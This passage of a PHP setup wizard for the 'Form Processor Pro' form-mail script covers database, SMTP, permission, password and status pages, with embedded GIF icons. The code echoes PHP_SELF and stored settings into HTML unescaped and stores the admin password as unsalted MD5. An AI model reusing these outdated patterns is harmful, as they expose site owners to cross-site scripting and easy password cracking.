		$noimg .= 'R0lGODlhEAAQAPcAAP/vJP/uIv/vKP/wLv/7S//xKPXfDfLhGv3tIP/sHd3FFPXt2+3duMyfI+G0MLuPHsGXMP/vJriPGraMF9Kz';
		$noimg .= 'bP/xJf/wJ9u7J//0O+rcvde+CerRFujbvOratvbgDv/wLP/1MPXpzcujQ9S8hPny4/j06/jy5beTQP/xLN28H86kG//wKvv48NG3';
		$noimg .= 'ev/3Rf/1QerYrufKK8+zcvjt0+fPLs+vY7OOA8CaNvLcD9W1bLiQIePCdPDbC/nmJPv1V/z7+NWoQNCzcP7sFv/tGuTJO//0Nciv';
		$noimg .= 'dL6YQdusPvrxUv/xLf/5S//tH//6UP/vKf/tHMqiRfbfGPzsIMuiIPHgG//1OOjWF//7UOrXG//5Ovz69//2OdK4ELqSMNu6GPbh';
		$noimg .= 'ENaxW92/DbyaBM6vaMSfDf/1PLKHCf7+/de4CfHp1ezGbv/yNOPCD/joGfvuPf/xJu3fvenRmf/uH+3hxf/vIte/E8OUDvnkEfbq';
		$noimg .= 'z72WNP/0NvnkE+zbsvDcCv/9V+3Xo9evGfv59PrlFM2fH97Mou3WEv/2O7yTMOjRnPn/avrrNvHguPrmFt3AD/Tlw//sHcWaMd/B';
		$noimg .= 'Jf3pGf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$noimg .= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAJMALAAAAAAQABAAAAjMACcJHEiwYEFHYPAQRCSiwxmCaoj4QDJw';
		$noimg .= 'EaA3bCARdJDIT4w/k0KoAMFEQQ2CO5JcITAIToMqAA48YEFwxoUmLhTZKbMCARkGBoEseYFhi5IKdXIYnMQnkqE1AyxgOaTFIAko';
		$noimg .= 'NPQMEEBnw5FABeNMcVPkg4AACYYUymNiIIwUWVA4iSDliSRGgnBI4CAwg5cCAAJQMdNIyJ4vHvqcEAihh5xHVibMGRPmjgEeYggJ';
		$noimg .= 'lBGlDZcuCwRSQKPBRpCBJW7oGPGDYAsjaZbKJhgQADs=';

		header('Content-type: image/gif;');
		echo base64_decode($noimg);
		exit();
	}

	function img_skip(){
		$skip_img  ='R0lGODlhEAAQAHAAACH5BAEAAJQALAAAAAAQABAAh/////f/+PX/9/7//vv/+/b/9vz//Pf/9/n/+d3/39b/2e7/7tP/0/H/8df/';
		$skip_img .='1+r/6uH/4cniycvktszls8zlyc3n0c/pzdHlt8XnsbLptrLUuK3SsJvsm5nPmZesl4SwhHyyfJnOmbvKl8HJlZnKlI/HlZDFi5DJ';
		$skip_img .='ZpPLbpLFjnGhblycWF/BX0OVRCdeJyZdJiZeJsP3w67apqDJlpzPm4O1hWyka2/KaXHFW2+iRmydPV2SOT97OzaEOS6LLg9rDwJd';
		$skip_img .='Ar7zvqXcqJLIlYm9inamdWCXYVKlWVamRGSaK12QLEx9MDViMih2KhyKHAZwBgBkAJnMmZ3QnY7CjmqdamaZZmGUYjltPUN2L2aZ';
		$skip_img .='M0d6MzBiNDVlNRlmGQBmAJOhk3uke2egZ1+SX0h+SDFoMiZbJypOIzVHJC5UKRxRIAI2AglGCRNXEwU9BQAxAKKqoo2qjX6sfnuw';
		$skip_img .='e2mXaVd/VlGGUVNyVFlVXFZ1V0l+STFbMUJvQlODUztjOzBUMMX2xeb25ur26sP2w9f01+vy68TyxMzwzO3t7szwzcPxw+ft59Pv';
		$skip_img .='07/yv+Du4O/s7+n/6e3/7fX/9fT/9O//7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$skip_img .='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$skip_img .='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$skip_img .='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
		$skip_img .='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAizAAEIHEiwoMGDCBMSTKCA4AIGCwBABJCA';
		$skip_img .='QQQMGCIYMoQxgwYhHKJ4AAEiiogRKUqkOHHCRJUVLHzASAMjhpAZUYhUuYEjR5Yde3z4+AEkiJCcYFYcQZIkCxYuTZw88RIlZ5Wr';
		$skip_img .='XLA45cLlh5evHsC83MMlTZozaNK4WcPGjZs3cIrAqcKHD547eMb42cOnjx8GjxYESXCIgaFDixgcahRkwaFHBQAsiLgg8mTJERVq';
		$skip_img .='3sx5YEAAOw==';
		
		header('Content-type: image/gif;');
		echo base64_decode($skip_img);
		exit();		
	}
	
	
	function login_page(){
		global $lang;
		print_header($lang->getValue('conf_script_title'));
		print_login_screen();
		print_footer();
		exit;
	}
	
	function db_page($menu =''){
        global $config, $lang, $step;	
        
        if($_POST['skip']){
        	setcookie('dbok','2');
        	header('Location: index.php?step=4');
        	exit;
        }
        
		$selected = array();
		
		if($_POST['dbtype']){setcookie('dbtype', $_POST['dbtype']);
		   $dbt = $_POST['dbtype'];
		} else {
		   $dbt = $_COOKIE['dbtype'];
		}
		
		switch ($dbt){
			case 'mssql': {
				$db_type = 'mssql';
				$selected[1] = 'selected';
			} break;
			case 'pgsql': {
				$db_type = 'pgsql';
				$selected[2] = 'selected';
			} break;
			default: {
				$db_type = 'mysql';
				$selected[0] = 'selected';
			} 
		}
        if(isset($_POST['db_host'])){
        	$config->setSetting($db_type.'_host', $_POST['db_host']);
        	$config->setSetting($db_type.'_user', $_POST['db_user']);
        	$config->setSetting($db_type.'_password', $_POST['db_password']);
        	$config->setSetting($db_type.'_db', $_POST['db_name']);
        	$msg = '<font color="#008000">'.$lang->getValue('fpp_db_setting_saved').'</font>';
        }
        if($_POST['test']){
            $config = new wConfig;
            $tdbase = new tDB();            
            $tdbase->host = $config->getSetting($db_type.'_host');
            $tdbase->user = $config->getSetting($db_type.'_user');
            $tdbase->pw = $config->getSetting($db_type.'_password');
            $tdbase->db = $config->getSetting($db_type.'_db');

        	switch ($db_type) {
			case 'mssql': {
					$test_msg = $tdbase->tmssql();
					if($test_msg==1){
						setcookie('dbok', '1');
						$test_msg = '<font color="#008000">'.$lang->getValue('fpp_test_mssql_ok').'</font>';
					}
				} break;
				case 'pgsql': {
					$test_msg = $tdbase->tpgsql();
					if($test_msg==1){
						setcookie('dbok', '1');
						$test_msg = '<font color="#008000">'.$lang->getValue('fpp_test_pgsql_ok').'</font>';
					}
				} break;
				default: {
					$test_msg = $tdbase->tmysql();
					if($test_msg==1){
						setcookie('dbok', '1');
						$test_msg = '<font color="#008000">'.$lang->getValue('fpp_test_mysql_ok').'</font>';
					}
				} 
        	}
        	
        }        

        $config = new wConfig;
		
		print_header($lang->getValue('conf_script_title'));
        $config_db_host = $config->getSetting($db_type.'_host');
        $config_db_user = $config->getSetting($db_type.'_user');
        $config_db_password = $config->getSetting($db_type.'_password');
        $config_db_name = $config->getSetting($db_type.'_db');
                
   
        ?>
        
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1><?=$lang->getValue('conf_script_title'); ?></h1></td>
				</table>
			</td>
		</tr>
       <?=$menu;?>
    </table>
    <br />		
    <table width="600" cellpadding="5" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
      <tr>
      <td width="400" class="tdr">
         <h3><?=$lang->getValue('database_settings');?></h3>
         <p align="justify"><?=$msg;?></p>
         <p align="justify">Skip this step if you do not intend to use database functionality (save submissions to database).
Please select database type you would like to use. You can save settings for more than one database. </p>
      
       
          <table cellpadding="0" cellspacing="0" border="0" align="center" width="90%">
             <tr><td class="tdj">DB Type</td><td class="tdj"><form action="?step=3"  method="POST"><select name="dbtype" style="width: 128px;" onchange="submit();">
                 <option value="mysql" <?=$selected[0];?>>MySQL</option>
                 <option value="mssql" <?=$selected[1];?>>Microsoft SQL</option>
                 <option value="pgsql" <?=$selected[2];?>>PostgreeSQL</option></select></form>
             </td></tr>
          <form action="?step=3"  method="POST" onclick="this.save.click()">   
             <tr><td width="100" class="tdj">DB host</td>
			  <td class="tdj"><input type="text" name="db_host" value="<?=$config_db_host; ?>" /></td>
			</tr>
            <tr><td class="tdj">DB User</td><td class="tdj"><input type="text" name="db_user" value="<?=$config_db_user; ?>" /></td></tr>
            <tr><td class="tdj">DB Password</td><td class="tdj"><input type="text" name="db_password" value="<?=$config_db_password; ?>" /></td></tr>
            <tr><td class="tdj">DB Name</td><td class="tdj"><input type="text" name="db_name" value="<?=$config_db_name; ?>" /></td></tr>
          </table>
         <p align="justify"><font color="#FF0000"><?=$test_msg;?></font></p>
         <p><input class="btn" type="submit" name="save" value="Save Settings" />&nbsp;<input class="btn" type="submit" name="test" value="Test Connection" /></p>
      
         <p><input class="btn" type="button" name="back" value="&lt;&lt;Back"  onclick="document.location='./<?=$step[1]['link'];?>'" />&nbsp;<input class="btn" type="submit" name="skip" value="Skip" />&nbsp;<input class="btn" type="button" name="NEXT" value="Next&gt;&gt;" onclick="document.location='./<?=$step[3]['link'];?>'"/></p>
            </form>
       </td>

	  <td witdth="50"  class="tdr"></td>

      <td class="tdr" width="150" align="left" valign="top">
			   <div id='check' align="left">
			     <?php 
                   $step = get_steps();
			       foreach( $step as $val){
			       	   echo '<img src="'. $val['img'] .'" alt="" width="16" height="16"><a href="'.$val['link'].'">&nbsp;'. $val['descr']. '</a><br />';
			       }
			      
                 ?>
               </div>    
      </td>
      </tr>
    </table>

	<br />
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com" target="_blank">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com" target="_blank">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
		  
		<?php
		print_footer();
		exit;
	}
    function perm_page($menu = ''){
    	global $lang, $step;	
        
    /**
     * Checking writable dirs
     */
    $fw = array();
    $fw[0] = is_writable(ATTACHMENT_DIR)?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    $fw[1] = is_writable(TMP_DIR)?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    $fw[2] = is_writable(CONFIG_FILE)?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';

    print_header($lang->getValue('conf_script_title'));
    	
      ?>
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1><?=$lang->getValue('conf_script_title'); ?></h1></td>
				</table>
			</td>
		</tr>
       <?=$menu;?>
    </table>
    <br />		
    <table width="600" cellpadding="5" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
      <tr>
      <td width="400" class="tdr">
         <h3><?=$lang->getValue('checking_file_permissions');?></h3>
         <p align="justify"><?=$lang->getValue('shoud_be_wrtbl');?></p>
         <table width="50%" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
           <tr>
             <td width="50%"  align="left" style="border-right: solid 1px #CECECE;"><div align="left"><b>/attachments</b></div></td>
             <td width="50%"><?=$fw[0];?></td>
           </tr>
           <tr>
             <td width="50%" class="tdd" align="left"><div align="left"><b>/tmp</b></div></td>
             <td width="50%" class="tdl"><?=$fw[1];?></td>
           </tr>
           <tr>
             <td width="50%"  class="tdd" align="left"><div align="left"><b>config.php</b></div></td>
             <td width="50%" class="tdl"><?=$fw[2];?></td>
           </tr>                      
         </table>
         
         <p align="justify"><?=$lang->getValue('set_correct_permissions');?></p>
         <p align="justify"></p>
         <p><input class="btn" type="button" name="back" value="Next&gt;&gt;" onclick="document.location='<?=$step[1]['link'];?>'"/></p>
       </td>

	  <td witdth="50"  class="tdr"></td>
      
      <td class="tdr" width="150" align="left" valign="top">

			   <div id='check' align="left">
			     <?php 
                   $step = get_steps();
			       foreach( $step as $val){
			       	   echo '<img src="'. $val['img'] .'" alt="" width="16" height="16"><a href="'.$val['link'].'">&nbsp;'. $val['descr']. '</a><br />';
			       }
			      
                 ?>
               </div>    
      </td>
      </tr>
    </table>

	<br />
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
		  
		<?php
		print_footer();
		exit;
    }	
    
	function mail_page($menu =''){
        global $config, $lang, $step;	
            
        if($_POST['test']) {
        	$email = trim($_POST['email']);
        	
        	if(preg_match('/^(?:(?#local-part)(?#quoted)"[^\"]*"|(?#non-quoted)[a-z0-9&+_-](?:\.?[a-z0-9&+_-]+)*)@(?:(?#domain)(?#domain-name)[a-z0-9](?:[a-z0-9-]*[a-z0-9])*(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])*)*|(?#ip)(\[)?(?:[01]?\d?\d|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d?\d|2[0-4]\d|25[0-5])){3}(?(1)\]|))$/i', $email)&&$email!=''){
            	$em = new tEmail();
            	$em->smtp = $config->getSetting('smtp_server');
        	    $em->port = $config->getSetting('smtp_port');
            	$em->login = $config->getSetting('smtp_login');
            	$em->passw = $config->getSetting('smtp_password');
            	$em->to = $email;
            	$em->from = $email;
            	$em->subject = $lang->getValue('ffp_mail_test_subject');
            	$em->msg = $lang->getValue('fpp_mail_test_msg');

            	$res = ($_POST['useauth']!='a')?$em->send():$em->asend();
            	if($res== -1){
            		$msg = '<font color="#008000">'.$lang->getValue('ffp_mail_test_complete_message').'</font>';
        	    	$step[1]['status'] = true;
        		    setcookie('mailok','1');
            	} else {
            		$msg = '<font color="#FF0000">'.$res.'</font>';
            		$step[1]['status'] = false;
        	    	setcookie('mailok','0');
            	}
        	} else {
            		$msg = '<font color="#FF0000">'.htmlentities($lang->getValue('form_err_email', 'Your email')).'</font>';
            		$step[1]['status'] = false;
        	    	setcookie('mailok','0');
        	} 
        }
        $step = get_steps();
        $blank = array();
        
        if($_POST['update']){
        	if(trim($_POST['smtp_server'])==''){
        		$blank[] = 'SMTP server';
        	}
        	if(trim($_POST['smtp_port'])==''){
        		$blank[] = 'SMTP port';
        	}
        	
        	$fields = implode(', ', $blank);
        	
        	if($fields!=''){
        		$msg = '<font color="#FF0000">'.$lang->getValue('fields_cant_be_blank', $fields).'</font>';
        	} else {
        	    $config->setSetting('smtp_server', $_POST['smtp_server']);
        	    $config->setSetting('smtp_port', $_POST['smtp_port']);
        	    if(trim($_POST['smtp_login'])!='') {
        	    	$config->setSetting('smtp_login', $_POST['smtp_login']);
        	    	$config->setSetting('smtp_password', $_POST['smtp_password']);
        	    }
        	    $msg = '<font color="#008000">'.$lang->getValue('fpp_mail_settings_saved').'</font>';
        	}
        }
        $config = new wConfig;
		print_header($lang->getValue('conf_script_title'));
		$default_smtp = (@ini_get('SMTP').''!='')? ini_get('SMTP') : 'localhost';
        $default_port = (@ini_get('smtp_port').''!='')? ini_get('smtp_port') : '25';
	
        $config_smtp_server = $config->getSetting('smtp_server');
        $config_smtp_port = $config->getSetting('smtp_port');
        $config_smtp_login = $config->getSetting('smtp_login');
        $config_smtp_password = $config->getSetting('smtp_password');
        ?>
        
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1><?=$lang->getValue('conf_script_title'); ?></h1></td>
				</table>
			</td>
		</tr>
       <?=$menu;?>
    </table>
    <br />		
    <table width="600" cellpadding="5" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
      <tr>
      <td width="400" class="tdr">
         <h3><?=$lang->getValue('email_server_settings');?></h3>
         <p align="justify"><?=$msg;?></p>
         <p align="justify"><b>Information below can be useful:</b><br >Default mail server settings received from your PHP configuration. You should try these settings first. They have to work in most cases. Try other settings, otherwise.</p>
      <form action="?step=2" name="mailset" method="POST" />
          <table cellpadding="0" cellspacing="0" border="0" align="center" >
             <tr><td width="100" class="tdj">SMTP server</td>
			  <td class="tdj"><?=$default_smtp;?></td>
			</tr>
            <tr><td class="tdj">SMTP port</td><td><?=$default_port;?></td></tr>
          </table>
         <p align="justify">Click here to copy and paste these settings below, then save and give it a test.<br /></p>
         <center><input type="button" name="copy" value="<?=$lang->getValue('cpy_smtp_def');?>" class="btn" onclick="document.getElementById('server').value='<?=$default_smtp; ?>';document.getElementById('port').value='<?=$default_port; ?>'"/></center>
         
         <p align="justify"><b>Type mail server settings:</b><br />Your current mail server settings for Form Processor Pro (in config.php):</p>
         
          <table cellpadding="0" cellspacing="0" border="0" align="center" width="90%">
             <tr><td width="100" class="tdj">SMTP server</td>
			  <td class="tdj" ><input type="text" name="smtp_server" id="server" value="<?=$config_smtp_server; ?>" /></td><td></td>
			</tr>
            <tr><td class="tdj" width="100">SMTP port</td><td  class="tdj" ><input type="text" name="smtp_port" id="port" value="<?=$config_smtp_port; ?>" /></td><td>(default: 25)</td></tr>
          </table>
         
         <p align="justify">If your mail server requires authorization type login and password below, otherwise leave blank (advanced and optional):</p>
          <table cellpadding="0" cellspacing="0" border="0" align="center"  width="90%">
             <tr><td width="100" class="tdj">SMTP login</td>  <td class="tdj"><input type="text" name="smtp_login" value="<?=$config_smtp_login; ?>" /></td>
			</tr>
            <tr><td class="tdj" width="100" >SMTP password</td><td class="tdj"><input type="text" name="smtp_password" value="<?=$config_smtp_password; ?>" /></td></tr>
          </table>
         <p><input type="submit" name="update" value="Save Settings" class="btn" /></p>
         <p align="justify"><b>Test your settings:</b><br />Type your email below to test your mail server settings. You should get a test email from Form Processor Pro to your mail box with "FPP Mail Server Test Successful" subject. Try other settings if you don't get this email. This is not a configuration field, it is provided for testing purposes only.</p>
         <form action="?step=2" method="POST" />
         <p  align="justify"><input type="hidden" name="useauth" value="" /><input type="checkbox" name="useauth" value="a" <?=$_POST['useauth']=='a'?'checked':'';?>/> <?=$lang->getValue('fpp_mail_test_use_auth');?></p>
         <table cellpadding="0" cellspacing="0" border="0" align="center"  width="90%">
           <tr><td>Your email:</td>
           <td><input type="text" name="email" value="" /></td>
           <td><input type="submit" name="test" value="<?=$lang->getValue('test_mail_button');?>" class="btn"/></td>
           </tr>
         </table>
         </form>
         <p><input class="btn" type="button" name="back" value="&lt;&lt;Back"  onclick="document.location='<?=$step[0]['link'];?>'" /> <input class="btn" type="button" name="back" value="Next&gt;&gt;" onclick="document.location='<?=$step[2]['link'];?>'"/></p>
       </td>

	  <td witdth="50"  class="tdr"></td>
      
      <td class="tdr" width="150" align="left" valign="top">

			   <div id='check' align="left">
			     <?php 
                   $step = get_steps();
			       foreach( $step as $val){
			       	   echo '<img src="'. $val['img'] .'" alt="" width="16" height="16"><a href="'.$val['link'].'">&nbsp;'. $val['descr']. '</a><br />';
			       }
			      
                 ?>
               </div>      
      </td>
      </tr>
    </table>

	<br />
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
		  
		<?php
		print_footer();
		exit;
}

    function password_page($menu = ''){
    	global $config, $lang, $step;	

        if($_POST['update']){
        	if(login($_POST['oldpassword'])) {
        		if(strlen(trim($_POST['newpassword']))>=8){
                    $config->setSetting('fpp_key', md5($_POST['newpassword']));
                    setcookie('pswchg', '1');
                    $msg = '<font color="#008000">'.$lang->getValue('pw_has_been_changed').'</font>';
        		} else {
        		    setcookie('pswchg', '0');
          		    $msg = '<font color="#FF0000">'.$lang->getValue('pw_less_than_8').'</font>';
        		}
        	} else {
        		setcookie('pswchg', '0');
        		$msg = '<font color="#FF0000">'.$lang->getValue('old_pw_is_wrong').'</font>';
        	}

                if(preg_match('/^(?:(?#local-part)(?#quoted)"[^\"]*"|(?#non-quoted)[a-z0-9&+_-](?:\.?[a-z0-9&+_-]+)*)@(?:(?#domain)(?#domain-name)[a-z0-9](?:[a-z0-9-]*[a-z0-9])*(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])*)*|(?#ip)(\[)?(?:[01]?\d?\d|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d?\d|2[0-4]\d|25[0-5])){3}(?(1)\]|))$/i', $_POST['email_address'])&&$_POST['email_address']!=''){
                        $config->setSetting('email_address', $_POST['email_address']);
                } else {
                        $msg = '<font color="#FF0000">'.htmlentities($lang->getValue('form_err_email', 'Your email')).'</font>';
            		$step[1]['status'] = false;
        	    	#setcookie('mailok','0');
                        setcookie('pswchg', '0');
                }
        }

        $config = new wConfig;
		print_header($lang->getValue('conf_script_title'));
	    // print_r($config->getSetting('smtp_server'));
        $config_password = $config->getSetting('fpp_key');
        
        ?>
        
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1><?=$lang->getValue('conf_script_title'); ?></h1></td>
				</table>
			</td>
		</tr>
       <?=$menu;?>
    </table>
    <br />		
    <table width="600" cellpadding="5" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
      <tr>
      <td width="400" class="tdr">
         <h3><?=$lang->getValue('change_password');?></h3>
         <p align="justify"><?=$lang->getValue('chg_psw_page_txt');?></p>
         <p align="justify"><?=$msg;?></p>
         <form action="?step=4" method="POST">
          <table cellpadding="0" cellspacing="0" border="0" align="center" width="90%">
             <tr><td width="150" class="tdj">Old Password</td> <td class="tdj"><input type="text" name="oldpassword" value="" /></td><td></td></tr>
             <tr><td width="150" class="tdj">New Password</td> <td class="tdj"><input type="text" name="newpassword" value="" /></td></tr>
             <tr><td width="150" class="tdj">Email address</td> <td class="tdj"><input type="text" name="email_address" value="<?=$config->getSetting('email_address');?>" /></td>
                <td><input type="submit" name="update" value="<?=$lang->getValue('psw_save_btn');?>" class="btn" /></td></tr>
          </table>
         </form>
         <p><a href="<?=$step[2]['link'];?>"><input class="btn" type="button" name="back" value="&lt;&lt;Back"/></a><input class="btn" type="button" name="back" value="Next&gt;&gt;" onclick="document.location='<?=$step[4]['link'];?>'"/></p>
       </td>

	  <td witdth="50"  class="tdr"></td>
      
      <td class="tdr" width="150" align="left" valign="top">

			   <div id='check' align="left">
			     <?php 
                   $step = get_steps();
			       foreach( $step as $val){
			       	   echo '<img src="'. $val['img'] .'" alt="" width="16" height="16"><a href="'.$val['link'].'">&nbsp;'. $val['descr']. '</a><br />';
			       }
			      
                 ?>
               </div>
      </td>
      </tr>
    </table>

	<br />
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
		  
		<?php
		print_footer();
		exit;
    }
    
    function status_page($menu = ''){
    	global $config, $lang, $step;	
        
    	$result = false;
        
    	
    	$res[0] = $step[0]['status']?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    	$res[1] = $step[1]['status']?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    	
    	switch ($step[2]['status']) {
    		case 1:
    			$res[2] = '<font color="#008000">'.$lang->getValue('successful').'</font>';
    			break;
    		case 2:
    			$res[2] = '<font color="#000080">'.$lang->getValue('skipped').'</font>';
    			break;    			
    		case 0:
    			$res[2] = '<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    			break;    	
    		default:
    			$res[2] = '<font color="#FF0000">'.$lang->getValue('failed').'</font>';
    			break;
    	}
    	;
    	
    	$res[3] = $step[3]['status']?'<font color="#008000">'.$lang->getValue('successful').'</font>':'<font color="#FF0000">'.$lang->getValue('failed').'</font>';
        $s = (is_writable(ATTACHMENT_DIR)&&is_writable(TMP_DIR)&&is_writable(CONFIG_FILE))&&($_COOKIE['mailok']=='1')&&(isset($_COOKIE['pswchg']));    	
    	$title = ($s)? $lang->getValue('status_complete_title'):$lang->getValue('status_uncomplete_title');
    	$msg = ($s)?$lang->getValue('status_complete_msg'):'<font color="#FF0000">'.$lang->getValue('status_uncomplete_msg').'</font>';
    	print_header($lang->getValue('conf_script_title'));

      ?>
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
					<tr><td width="177"><a href="http://www.email-form.com/" title="Form Processor Pro"><img src="<?=$_SERVER['PHP_SELF']; ?>?img_logo" alt="Form Processor Pro" border="0"></a></td>
					<td style="border-bottom: solid 1px #CECECE; vertical-align: middle;"><h1><?=$lang->getValue('conf_script_title'); ?></h1></td>
				</table>
			</td>
		</tr>
       <?=$menu;?>
    </table>
    <br />		
    <table width="600" cellpadding="5" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
      <tr>
      <td width="400" class="tdr">
         <h3><?=$title;?></h3>
         <p align="justify"><ol>
           <li><?=$step[0]['descr'].' - '. $res[0];?></li>
           <li><?=$step[1]['descr'].' - '. $res[1];?></li>
           <li><?=$step[2]['descr'].' - '. $res[2];?></li>
           <li><?=$step[3]['descr'].' - '. $res[3];?></li>
         </ol></p>
         <p align="justify"><?=$msg;?></p>
         <p><a href="<?=$step[3]['link'];?>"><input class="btn" type="button" name="back" value="&lt;&lt;Back"/></a><a href="<?=$step[4]['link'];?>"></p>
       </td>

	  <td witdth="50"  class="tdr"></td>
      
      <td class="tdr" width="150" align="left" valign="top">

			   <div id='check' align="left">
			     <?php 
                   $step = get_steps();
			       foreach( $step as $val){
			       	   echo '<img src="'. $val['img'] .'" alt="" width="16" height="16"><a href="'.$val['link'].'">&nbsp;'. $val['descr']. '</a><br />';
			       }
			      
                 ?>
               </div>     
      </td>
      </tr>
    </table>

	<br />
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE; background: #f4f4f4;">
    <tr>
      <td><p align="center">&copy; 2000-2008 <a href="http://www.email-form.com">Email-Form.com</a> 
    All Rights reserved.<br>    Powered by <a href="http://www.web-site-scripts.com">Web-Site-Scripts.com</a></p>
      </td>
    </tr>
    </table>
		  
		<?php
		print_footer();
		exit;
    }	
    
	function print_login_screen() {
		global $lang;
		$msg = isset($_POST['password'])?$lang->getValue('ffp_login_invalid_pw'):'';
?>	
   
	<table width="600" cellpadding="0" cellspacing="0" border="0" align="center" style="border: solid 1px #CECECE;">
		<tr>
			<td style="text-align: left;" colspan="4">
				<table width="100%" cellpadding="0" cellspacing="0" border="0">
